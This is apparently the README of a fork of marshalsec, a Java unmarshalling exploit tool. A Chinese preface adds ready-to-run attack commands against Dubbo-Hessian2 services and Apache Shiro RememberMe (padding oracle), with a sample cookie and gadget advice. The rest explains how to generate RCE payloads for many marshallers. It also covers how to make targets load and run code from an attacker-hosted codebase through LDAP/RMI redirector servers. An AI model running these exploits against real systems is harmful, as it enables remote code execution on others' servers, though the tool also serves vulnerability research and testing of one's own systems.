# PS
个人加入了以下exploits：

### 1. DubboHessian
用于攻击Dubbo-Hessian2的反序列化实现，dubbo默认使用hessian2序列化RPC数据

使用方式：
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.DubboHessian
--attack
dubbo服务host
dubbo服务port
gadget（SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean2, Resin）
gadget参数
```
例：
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.DubboHessian
--attack
127.0.0.1
20880
XBean2
http://127.0.0.1:80/ 
Calc
```

### 2. ShiroPaddingOracleCBC
用于攻击使用了Apache Shiro的系统，条件：
1. shiro < 1.4.2
2. 启用了RememberMe
3. 具有user权限认证的filter配置

使用方式：
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.ShiroPaddingOracleCBC
--attack
具有user权限的url
rememberMe的base64值
gadget（URLDNS, CommonsCollections, CommonsBeanutils1, JRMPClient）
gadget参数
```
例：
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.ShiroPaddingOracleCBC
--attack 
http://localhost:8888/system/main 
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 
URLDNS 
http://baidu.com
```
建议使用JRMPClient打，payload长度只有96字节,可以快速padding完成，不过需要使用ysoserial在可访问的ip起一个JRMPListener

# Java Unmarshaller Security - Turning your data into code execution

## Paper

It's been more than two years since Chris Frohoff and Garbriel Lawrence have presented their research into Java object deserialization vulnerabilities ultimately resulting in what can be readily described as the biggest wave of remote code execution bugs in Java history.

Research into that matter indicated that these vulnerabilities are not exclusive to mechanisms as expressive as Java serialization or XStream, but some could possibly be applied to other mechanisms as well.

This paper presents an analysis, including exploitation details, of various Java open-source marshalling libraries that allow(ed) for unmarshalling of arbitrary, attacker supplied, types and shows that no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques.

Full paper is at [marshalsec.pdf](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)

## Disclaimer

All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## Usage

Java 8 required. Build using maven ```mvn clean package -DskipTests```. Run as

```shell
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
```

where

* **-a** - generates/tests all payloads for that marshaller
* **-t** - runs in test mode, unmarshalling the generated payloads after generating them.
* **-v** - verbose mode, e.g. also shows the generated payload in test mode.
* **gadget_type** - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
* **arguments** - Gadget specific arguments

Payload generators for the following marshallers are included:<br />

| Marshaller                      | Gadget Impact
| ------------------------------- | ----------------------------------------------
| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization<br/>various third party libraries RCEs
| Hessian&#124;Burlap             | various third party RCEs
| Castor                          | dependency library RCE
| Jackson                         | **possible JDK only RCE**, various third party RCEs
| Java                            | yet another third party RCE
| JsonIO                          | **JDK only RCE**
| JYAML                           | **JDK only RCE**
| Kryo                            | third party RCEs
| KryoAltStrategy                 | **JDK only RCE**
| Red5AMF(0&#124;3)               | **JDK only RCE**
| SnakeYAML                       | **JDK only RCEs**
| XStream                         | **JDK only RCEs**
| YAMLBeans                       | third party RCE

## Arguments and additional prerequisites

### System Command Execution

* **cmd** - command to execute
* **args...** - additional parameters passed as arguments

No prerequisites.

### Remote Classloading (plain)

* **codebase** - URL to remote codebase
* **class** - Class to load

**Prerequisites**:

* Set up a webserver hosting a Java classpath under some path.
* Compiled class files to load need to be served according to Java classpath conventions.

### Remote Classloading (ServiceLoader)

* **service_codebase** - URL to remote codebase

The service to load is currently hardcoded to *javax.script.ScriptEngineFactory*.

**Prerequisites**:

* Same as plain remote classloading.
* Also needs a provider-configuration file at *<codebase>*/META-INF/javax.script.ScriptEngineFactory
  containing the targeted class name in plain text.
* Target class specified there needs to implement the service interface *javax.script.ScriptEngineFactory*.


### JNDI Reference indirection

* **jndiUrl** - JNDI URL to trigger lookup on


**Prerequisites**:

* Set up a remote codebase, same as remote classloading.
* Run a JNDI reference redirector service pointing to that codebase -
  two implementations are included: *marshalsec.jndi.LDAPRefServer* and *RMIRefServer*.

      ```java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]```

* Use (ldap|rmi)://*host*:*port*/obj as the *jndiUrl*, pointing to that service's listening address.

## Running tests

There are a couple of system properties that control the arguments when running tests (through maven or when using **-a**)

* **exploit.codebase**, defaults to *http://localhost:8080/*
* **exploit.codebaseClass**, defaults to *Exploit*
* **exploit.jndiUrl**, defaults to *ldap://localhost:1389/obj*
* **exploit.exec**, defaults to */usr/bin/gedit*

Tests run with a SecurityManager installed that checks for system command execution as well as code executing from remote codebases.
For that to work the loaded class in use must trigger some security manager check.



